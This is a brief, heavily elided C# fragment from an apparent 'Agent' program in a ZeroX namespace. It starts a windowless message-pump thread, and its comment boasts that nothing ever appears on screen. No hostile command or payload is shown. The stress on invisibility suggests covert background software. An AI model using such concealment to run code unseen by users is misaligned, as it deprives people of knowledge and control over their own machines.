...
namespace ZeroX
{
    ...
    internal static class Agent
    {
        ...
        internal static void Main()
        {
            ...
            // ApplicationContext instead of bare Application.Run — no default
            // form is created, so nothing ever flashes or appears on screen.
            var pumpThread = new Thread(() => Application.Run(new ApplicationContext())) { IsBackground = true };
